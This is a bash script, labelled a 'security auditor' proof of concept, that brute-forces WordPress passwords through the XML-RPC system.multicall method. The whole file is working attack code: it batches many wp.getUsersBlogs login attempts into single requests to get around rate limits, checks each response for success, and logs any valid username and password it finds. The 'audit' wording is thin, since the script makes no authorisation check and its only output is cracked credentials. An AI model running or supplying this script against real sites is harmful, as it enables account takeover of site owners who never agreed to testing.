#!/bin/bash
# -----------------------------------------------------------------------------
# Project: WordPress XML-RPC Multicall Security Auditor
# Purpose: This script is a Proof-of-Concept (PoC) designed to demonstrate
#          vulnerabilities within the XML-RPC system.multicall method.
# Author: EverettIsNotDead
# -----------------------------------------------------------------------------

# Prompting user for target configuration
read -p "Target XML-RPC URL (e.g., https://example.com/xmlrpc.php): " URL
read -p "Target Username: " USERNAME
read -p "Path to Password List (e.g., wordlist.txt): " PASS_FILE
read -p "Batch Size (Max 250, Recommended 50): " BATCH_SIZE

# Default configuration and logging
BATCH_SIZE=${BATCH_SIZE:-50}
LOG_FILE="security_audit_log.txt"
DELAY=1 # Delay in seconds to maintain infrastructure stability

# Validation: Check if the password file exists
if [ ! -f "$PASS_FILE" ]; then
    echo "Error: Password list not found at $PASS_FILE"
    exit 1
fi

# Initialize Audit Log
echo "--- Security Audit Initiated: $(date) ---" >> "$LOG_FILE"
echo "Target: $URL | User: $USERNAME" >> "$LOG_FILE"

TOTAL_PASSWORDS=$(wc -l < "$PASS_FILE")
COUNTER=0

# Function: Generate XML payload for system.multicall
# This method bundles multiple authentication attempts into a single HTTP request.
generate_xml() {
    echo "<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
    for pass in "$@"; do
        echo "<value><struct><member><name>methodName</name><value>wp.getUsersBlogs</value></member><member><name>params</name><value><array><data><value><array><data><value><string>$USERNAME</string></value><value><string>$pass</string></value></data></array></value></data></array></value></member></struct></value>"
    done
    echo "</data></array></value></param></params></methodCall>"
}

# Function: Verify individual credentials
# Triggered only when a batch request indicates a potential match.
single_check() {
    local pass="$1"
    RESPONSE=$(curl -s -k -L -X POST "$URL" -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$USERNAME</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>")
    
    # Check for the absence of XML-RPC fault responses
    if ! echo "$RESPONSE" | grep -q "<fault>"; then
        echo -e "\n[SUCCESS] Valid Credential Identified: $pass"
        echo "[MATCH] Valid Pair: $USERNAME : $pass at $(date)" >> "$LOG_FILE"
        exit 0
    fi
}

batch=()
echo "Audit in progress: Processing $TOTAL_PASSWORDS entries..."

# Iterate through the provided wordlist
while IFS= read -r password; do
    batch+=("$password")
    COUNTER=$((COUNTER+1))
    echo -ne "Progress: $COUNTER / $TOTAL_PASSWORDS | Current Batch: ${#batch[@]}\r"

    # Execute batch request when BATCH_SIZE is reached
    if [ "${#batch[@]}" -ge "$BATCH_SIZE" ]; then
        XML=$(generate_xml "${batch[@]}")
        RESPONSE=$(curl -s -k -L -X POST "$URL" -d "$XML")
        
        # Analyze response for successful authentication indicators
        if echo "$RESPONSE" | grep -q "<name>blogName</name>"; then
            echo -e "\n[!] Positive response detected in batch. Initiating individual verification..."
            for pass in "${batch[@]}"; do
                single_check "$pass"
            done
        fi
        batch=()
        sleep "$DELAY"
    fi
done < "$PASS_FILE"

# Process remaining entries in the final batch
if [ "${#batch[@]}" -gt 0 ]; then
    XML=$(generate_xml "${batch[@]}")
    RESPONSE=$(curl -s -k -L -X POST "$URL" -d "$XML")
    if echo "$RESPONSE" | grep -q "<name>blogName</name>"; then
        for pass in "${batch[@]}"; do
            single_check "$pass"
        done
    fi
fi

echo -e "\nAudit complete. No valid credentials identified."
echo "--- Audit Concluded: $(date) ---" >> "$LOG_FILE"
